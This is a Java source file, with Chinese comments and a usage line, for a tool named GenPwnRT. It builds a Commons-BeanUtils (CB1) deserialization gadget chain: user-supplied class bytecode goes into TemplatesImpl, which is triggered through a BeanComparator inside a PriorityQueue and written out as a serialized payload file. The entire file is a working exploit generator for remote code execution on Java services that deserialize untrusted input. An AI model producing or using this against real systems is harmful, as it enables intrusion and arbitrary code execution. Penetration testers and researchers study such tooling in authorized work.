import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/** RT轮多类版 CB1 组装器：TemplatesImpl._bytecodes 为 byte[][]，可同时嵌入主 Translet
 *  与辅助类（匿名内部类等），定义走同一 ClassLoader，目标端可互相解析。
 *  用法: java -cp ".:beanutils:collections" GenPwnRT <out.ser> <主类.class> [辅助类.class ...] */
public class GenPwnRT {
    static void setF(Class<?> c, Object o, String n, Object v) throws Exception {
        Field f = c.getDeclaredField(n);
        f.setAccessible(true);
        f.set(o, v);
    }

    public static void main(String[] args) throws Exception {
        String out = args[0];
        byte[][] codes = new byte[args.length - 1][];
        for (int i = 1; i < args.length; i++) {
            codes[i - 1] = readAll(args[i]);
            System.out.println("[*] bytecode[" + (i - 1) + "]: " + args[i] + " " + codes[i - 1].length + " bytes");
        }

        Class<?> tc = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Object templates = tc.newInstance();
        setF(tc, templates, "_bytecodes", codes);
        setF(tc, templates, "_name", "pwn");
        try {
            Class<?> tfc = Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");
            setF(tc, templates, "_tfactory", tfc.newInstance());
        } catch (Throwable t) {
            System.out.println("[i] _tfactory skip: " + t);
        }

        Class<?> bc = Class.forName("org.apache.commons.beanutils.BeanComparator");
        Comparator comparator = (Comparator) bc.getConstructor(String.class).newInstance("lowestSetBit");

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
        queue.add(1);
        queue.add(1);
        setF(bc, comparator, "property", "outputProperties");
        setF(PriorityQueue.class.cast(queue), "comparator", comparator);
        setF(PriorityQueue.class.cast(queue), "queue", new Object[]{templates, templates});

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(out));
        oos.writeObject(queue);
        oos.close();
        System.out.println("OK " + out);
    }

    static void setF(Object o, String n, Object v) throws Exception {
        Class<?> c = o.getClass();
        while (c != null) {
            try {
                Field f = c.getDeclaredField(n);
                f.setAccessible(true);
                f.set(o, v);
                return;
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        throw new NoSuchFieldException(n);
    }

    static byte[] readAll(String p) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        FileInputStream in = new FileInputStream(p);
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
        in.close();
        return bos.toByteArray();
    }
}
